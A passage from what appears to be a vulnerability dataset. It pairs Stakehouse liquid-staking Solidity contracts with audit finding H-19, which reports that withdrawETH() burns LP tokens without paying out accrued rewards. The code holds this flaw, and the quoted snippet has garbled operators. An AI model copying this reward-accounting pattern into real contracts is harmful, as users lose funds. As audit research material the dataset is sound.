// As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\n",
        "CodeNames": [
            "GiantPoolBase.sol",
            "GiantMevAndFeesPool.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-19",
                "Location": [
                    "_distributeETHRewardsToUserForToken()",
                    "withdrawETH()",
                    "_onWithdraw()",
                    "claimRewards()",
                    "withdrawETH(",
                    "lpTokenETH",
                    "accumulatedETHPerLPShare"
                ],
                "Type": "  withdrawETH()  in GiantPoolBase don't call  _distributeETHRewardsToUserForToken()  or  _onWithdraw()  which would make users to lose their remaining rewards ",
                "Description": "*Submitted by unforgiven(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/260), also found by 0x4non(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/280)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L50-L64<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L180-L193\n\nFunction _distributeETHRewardsToUserForToken() is used to distribute remaining reward of user and it's called in _onWithdraw() of GiantMevAndFeesPool. but function withdrawETH() in GiantPoolBase don't call either of them and burn user giant LP token balance so if user withdraw his funds and has some remaining ETH rewards he would lose those rewards because his balance set to zero.\n\n\nThis is withdrawETH() code in GiantPoolBase:\n\n        /// @notice Allow a user to chose to burn their LP tokens for ETH only if the requested amount is idle and available from the contract\n        /// @param _amount of LP tokens user is burning in exchange for same amount of ETH\n        function withdrawETH(uint256 _amount) external nonReentrant {\n            require(_amount = MIN_STAKING_AMOUNT, \"Invalid amount\");\n            require(lpTokenETH.balanceOf(msg.sender) = _amount, \"Invalid balance\");\n            require(idleETH = _amount, \"Come back later or withdraw less ETH\");\n\n            idleETH -= _amount;\n\n            lpTokenETH.burn(msg.sender, _amount);\n            (bool success,) = msg.sender.call{value: _amount}(\"\");\n            require(success, \"Failed to transfer ETH\");\n\n            emit LPBurnedForETH(msg.sender, _amount);\n        }\n\nAs you can see it burn user lpTokenETH balance and don't call either _distributeETHRewardsToUserForToken() or _onWithdraw(). and in function claimRewards() uses lpTokenETH.balanceOf(msg.sender) to calculate user rewards so if user balance get to 0 user won't get the remaining rewards.\nThese are steps that this bug happens:\n\n1.  user1 deposit 10 ETH into the giant pool and claimed[user1][lpTokenETH] is 20 and accumulatedETHPerLPShare is 2.\n2.  some time passes and accumulatedETHPerLPShare set to 3.\n3.  user1 unclaimed rewards are 10 * 3 20 = 10 ETH.\n4.  user1 withdraw his 10 ETH by calling withdrawETH(10) and contract set lpTokenETH balance of user1  to 0 and transfer 10 ETH to user.\n5.  now if user1 calls claimRewards() he would get 0 reward as his lpTokenETH balance is 0.\n\nso users lose their unclaimed rewards by withdrawing their funds.\n\n\nVIM\n\n",
                "Repair": "\nUser's unclaimed funds should be calculated and transferred before any actions that change user's balance.\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/260#issuecomment-1329424012)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\npragma solidity 0.8.13;\n\n// SPDX-License-Identifier: MIT\n\n/// @notice Required interface for gatekeeping whether a member is allowed in a Stakehouse registry, brand or anything else for that matter\ninterface IGateKeeper {\n    /// @notice Called by the Stakehose registry or Community Central before adding a member to a house or brand\n    /// @param _blsPubKey BLS public key of the KNOT being added to the Stakehouse registry or brand\n    function isMemberPermitted(bytes calldata _blsPubKey) external view returns (bool);\n}\n\n\npragma solidity 0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { Ownable } from \"@openzeppelin/contracts/access/Ownable.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { ISyndicateInit } from \"../interfaces/ISyndicateInit.sol\";\nimport {\n    ZeroAddress,\n    EmptyArray,\n    InconsistentArrayLengths,\n    InvalidBLSPubKey,\n    InvalidNumberOfCollateralizedOwners,\n    KnotSlashed,\n    FreeFloatingStakeAmountTooSmall,\n    KnotIsNotRegisteredWithSyndicate,\n    NotPriorityStaker,\n    KnotIsFullyStakedWithFreeFloatingSlotTokens,\n    InvalidStakeAmount,\n    KnotIsNotAssociatedWithAStakeHouse,\n    UnableToStakeFreeFloatingSlot,\n    NothingStaked,\n    TransferFailed,\n    NotCollateralizedOwnerAtIndex,\n    InactiveKnot,\n    DuplicateArrayElements,\n    KnotIsAlreadyRegistered,\n    KnotHasAlreadyBeenDeRegistered\n} from \"./SyndicateErrors.sol\";\n\n/// @notice Syndicate registry and funds splitter for EIP1559 execution layer transaction tips across SLOT shares\n/// @dev This contract can be extended to allow lending and borrowing of time slots for borrower to redeem any revenue generated within the specified window\ncontract Syndicate is ISyndicateInit, Initializable, Ownable, ReentrancyGuard, StakehouseAPI {\n\n    /// @notice Emitted when the contract is initially deployed\n    event ContractDeployed();\n\n    /// @notice Emitted when accrued ETH per SLOT share type is updated\n    event UpdateAccruedETH(uint256 unprocessed);\n\n    /// @notice Emitted when new collateralized SLOT owners for a knot prompts re-calibration\n    event CollateralizedSLOTReCalibrated(bytes BLSPubKey);\n\n    /// @notice Emitted when a new KNOT is associated with the syndicate contract\n    event KNOTRegistered(bytes BLSPubKey);\n\n    /// @notice Emitted when a KNOT is de-registered from the syndicate\n    event KnotDeRegistered(bytes BLSPubKey);\n\n    /// @notice Emitted when a priority staker is added to the syndicate\n    event PriorityStakerRegistered(address indexed staker);\n\n    /// @notice Emitted when a user stakes free floating sETH tokens\n    event Staked(bytes BLSPubKey, uint256 amount);\n\n    /// @notice Emitted when a user unstakes free floating sETH tokens\n    event UnStaked(bytes BLSPubKey, uint256 amount);\n\n    /// @notice Emitted when either an sETH staker or collateralized SLOT owner claims ETH\n    event ETHClaimed(bytes BLSPubKey, address indexed user, address recipient, uint256 claim, bool indexed isCollateralizedClaim);\n\n    /// @notice Precision used in rewards calculations for scaling up and down\n    uint256 public constant PRECISION = 1e24;\n\n    /// @notice Total accrued ETH per free floating share for new and old stakers\n    uint256 public accumulatedETHPerFreeFloatingShare;\n\n    /// @notice Total accrued ETH for all collateralized SLOT holders per knot which is then distributed based on individual balances\n    uint256 public accumulatedETHPerCollateralizedSlotPerKnot;\n\n    /// @notice Last cached highest seen balance for all collateralized shares\n    uint256 public lastSeenETHPerCollateralizedSlotPerKnot;\n\n    /// @notice Last cached highest seen balance for all free floating shares\n    uint256 public lastSeenETHPerFreeFloating;\n\n    /// @notice Total number of sETH token shares staked across all houses\n    uint256 public totalFreeFloatingShares;\n\n    /// @notice Total amount of ETH drawn down by syndicate beneficiaries regardless of SLOT type\n    uint256 public totalClaimed;\n\n    /// @notice Number of knots registered with the syndicate which can be across any house\n    uint256 public numberOfRegisteredKnots;\n\n    /// @notice Informational - is the knot registered to this syndicate or not - the node should point to this contract\n    mapping(bytes => bool) public isKnotRegistered;\n\n    /// @notice Block number after which if there are sETH staking slots available, it can be supplied by anyone on the market\n    uint256 public priorityStakingEndBlock;\n\n    /// @notice Syndicate deployer can highlight addresses that get priority for staking free floating house sETH up to a certain block before anyone can do it\n    mapping(address => bool) public isPriorityStaker;\n\n    /// @notice Total amount of free floating sETH staked\n    mapping(bytes => uint256) public sETHTotalStakeForKnot;\n\n    /// @notice Amount of sETH staked by user against a knot\n    mapping(bytes => mapping(address => uint256)) public sETHStakedBalanceForKnot;\n\n    /// @notice Amount of ETH claimed by user from sETH staking\n    mapping(bytes => mapping(address => uint256)) public sETHUserClaimForKnot;\n\n    /// @notice Total amount of ETH that has been allocated to the collateralized SLOT owners of a KNOT\n    mapping(bytes => uint256) public totalETHProcessedPerCollateralizedKnot;\n\n    /// @notice Total amount of ETH accrued for the collateralized SLOT owner of a KNOT\n    mapping(bytes => mapping(address => uint256)) public accruedEarningPerCollateralizedSlotOwnerOfKnot;\n\n    /// @notice Total amount of ETH claimed by the collateralized SLOT owner of a KNOT\n    mapping(bytes => mapping(address => uint256)) public claimedPerCollateralizedSlotOwnerOfKnot;\n\n    /// @notice Whether a BLS public key, that has been previously registered, is no longer part of the syndicate and its shares (free floating or SLOT) cannot earn any more rewards\n    mapping(bytes => bool) public isNoLongerPartOfSyndicate;\n\n    /// @notice Once a BLS public key is no longer part of the syndicate, the accumulated ETH per free floating SLOT share is snapshotted so historical earnings can be drawn down correctly\n    mapping(bytes => uint256) public lastAccumulatedETHPerFreeFloatingShare;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @param _contractOwner Ethereum public key that will receive management rights of the contract\n    /// @param _priorityStakingEndBlock Block number when priority sETH staking ends and anyone can stake\n    /// @param _priorityStakers Optional list of addresses that will have priority for staking sETH against each knot registered\n    /// @param _blsPubKeysForSyndicateKnots List of BLS public keys of Stakehouse protocol registered KNOTs participating in syndicate\n    function initialize(\n        address _contractOwner,\n        uint256 _priorityStakingEndBlock,\n        address[] memory _priorityStakers,\n        bytes[] memory _blsPubKeysForSyndicateKnots\n    ) external virtual override initializer {\n        _initialize(\n            _contractOwner,\n            _priorityStakingEndBlock,\n            _priorityStakers,\n            _blsPubKeysForSyndicateKnots\n        );\n    }\n\n    /// @notice Allows the contract owner to append to the list of knots that are part of the syndicate\n    /// @param _newBLSPublicKeyBeingRegistered List of BLS public keys being added to the syndicate\n    function registerKnotsToSyndicate(\n        bytes[] calldata _newBLSPublicKeyBeingRegistered\n    ) external onlyOwner {\n        // update accrued ETH per SLOT type\n        updateAccruedETHPerShares();\n        _registerKnotsToSyndicate(_newBLSPublicKeyBeingRegistered);\n    }\n\n    /// @notice Make knot shares of a registered list of BLS public keys inactive - the action cannot be undone and no further ETH accrued\n    function deRegisterKnots(bytes[] calldata _blsPublicKeys) external onlyOwner {\n        updateAccruedETHPerShares();\n        _deRegisterKnots(_blsPublicKeys);\n    }\n\n    /// @notice Allows the contract owner to append to the list of priority sETH stakers\n    /// @param _priorityStakers List of staker addresses eligible for sETH staking\n    function addPriorityStakers(address[] calldata _priorityStakers) external onlyOwner {\n        updateAccruedETHPerShares();\n        _addPriorityStakers(_priorityStakers);\n    }\n\n    /// @notice Should this block be in the future, it means only those listed in the priority staker list can stake sETH\n    /// @param _endBlock Arbitrary block number after which anyone can stake up to 4 SLOT in sETH per KNOT\n    function updatePriorityStakingBlock(uint256 _endBlock) external onlyOwner {\n        updateAccruedETHPerShares();\n        priorityStakingEndBlock = _endBlock;\n    }\n\n    /// @notice Update accrued ETH per SLOT share without distributing ETH as users of the syndicate individually pull funds\n    function updateAccruedETHPerShares() public {\n        // Ensure there are registered KNOTs. Syndicates are deployed with at least 1 registered but this can fall to zero.\n        // Fee recipient should be re-assigned in the event that happens as any further ETH can be collected by owner\n        if (numberOfRegisteredKnots > 0) {\n            // All time, total ETH that was earned per slot type (free floating or collateralized)\n            uint256 totalEthPerSlotType = calculateETHForFreeFloatingOrCollateralizedHolders();\n\n            // Process free floating if there are staked shares\n            uint256 freeFloatingUnprocessed;\n            if (totalFreeFloatingShares > 0) {\n                freeFloatingUnprocessed = getUnprocessedETHForAllFreeFloatingSlot();\n                accumulatedETHPerFreeFloatingShare += _calculateNewAccumulatedETHPerFreeFloatingShare(freeFloatingUnprocessed);\n                lastSeenETHPerFreeFloating = totalEthPerSlotType;\n            }\n\n            uint256 collateralizedUnprocessed = ((totalEthPerSlotType - lastSeenETHPerCollateralizedSlotPerKnot) / numberOfRegisteredKnots);\n            accumulatedETHPerCollateralizedSlotPerKnot += collateralizedUnprocessed;\n            lastSeenETHPerCollateralizedSlotPerKnot = totalEthPerSlotType;\n\n            emit UpdateAccruedETH(freeFloatingUnprocessed + collateralizedUnprocessed);\n        } else {\n            // todo - check else case for any ETH lost\n        }\n    }\n\n    /// @notice Stake up to 4 collateralized SLOT worth of sETH per KNOT to get a portion of syndicate rewards\n    /// @param _blsPubKeys List of BLS public keys for KNOTs registered with the syndicate\n    /// @param _sETHAmounts Per BLS public key, the total amount of sETH that will be staked (up to 4 collateralized SLOT per KNOT)\n    /// @param _onBehalfOf Allows a caller to specify an address that will be assigned stake ownership and rights to claim\n    function stake(bytes[] calldata _blsPubKeys, uint256[] calldata _sETHAmounts, address _onBehalfOf) external {\n        if (_blsPubKeys.length == 0) revert EmptyArray();\n        if (_blsPubKeys.length != _sETHAmounts.length) revert InconsistentArrayLengths();\n        if (_onBehalfOf == address(0)) revert ZeroAddress();\n\n        // Make sure we have the latest accrued information\n        updateAccruedETHPerShares();\n\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            bytes memory _blsPubKey = _blsPubKeys[i];\n            uint256 _sETHAmount = _sETHAmounts[i];\n\n            if (_sETHAmount < 1 gwei) revert FreeFloatingStakeAmountTooSmall();\n            if (!isKnotRegistered[_blsPubKey] || isNoLongerPartOfSyndicate[_blsPubKey]) revert KnotIsNotRegisteredWithSyndicate();\n\n            if (block.number < priorityStakingEndBlock && !isPriorityStaker[_onBehalfOf]) revert NotPriorityStaker();\n\n            uint256 totalStaked = sETHTotalStakeForKnot[_blsPubKey];\n            if (totalStaked == 12 ether) revert KnotIsFullyStakedWithFreeFloatingSlotTokens();\n\n            if (_sETHAmount + totalStaked > 12 ether) revert InvalidStakeAmount();\n\n            totalFreeFloatingShares += _sETHAmount;\n            sETHTotalStakeForKnot[_blsPubKey] += _sETHAmount;\n            sETHStakedBalanceForKnot[_blsPubKey][_onBehalfOf] += _sETHAmount;\n            sETHUserClaimForKnot[_blsPubKey][_onBehalfOf] = (_sETHAmount * accumulatedETHPerFreeFloatingShare) / PRECISION;\n\n            (address stakeHouse,,,,,) = getStakeHouseUniverse().stakeHouseKnotInfo(_blsPubKey);\n            if (stakeHouse == address(0)) revert KnotIsNotAssociatedWithAStakeHouse();\n            IERC20 sETH = IERC20(getSlotRegistry().stakeHouseShareTokens(stakeHouse));\n            bool transferResult = sETH.transferFrom(msg.sender, address(this), _sETHAmount);\n            if (!transferResult) revert UnableToStakeFreeFloatingSlot();\n\n            emit Staked(_blsPubKey, _sETHAmount);\n        }\n    }\n\n    /// @notice Unstake an sETH position against a particular KNOT and claim ETH on exit\n    /// @param _unclaimedETHRecipient The address that will receive any unclaimed ETH received to the syndicate\n    /// @param _sETHRecipient The address that will receive the sETH that is being unstaked\n    /// @param _blsPubKeys List of BLS public keys for KNOTs registered with the syndicate\n    /// @param _sETHAmounts Per BLS public key, the total amount of sETH that will be unstaked\n    function unstake(\n        address _unclaimedETHRecipient,\n        address _sETHRecipient,\n        bytes[] calldata _blsPubKeys,\n        uint256[] calldata _sETHAmounts\n    ) external nonReentrant {\n        if (_blsPubKeys.length == 0) revert EmptyArray();\n        if (_blsPubKeys.length != _sETHAmounts.length) revert InconsistentArrayLengths();\n        if (_unclaimedETHRecipient == address(0)) revert ZeroAddress();\n        if (_sETHRecipient == address(0)) revert ZeroAddress();\n\n        // Claim all ETH owed before unstaking but even if nothing is owed `updateAccruedETHPerShares` will be called\n        _claimAsStaker(_unclaimedETHRecipient, _blsPubKeys);\n\n        for (uint256 i; i < 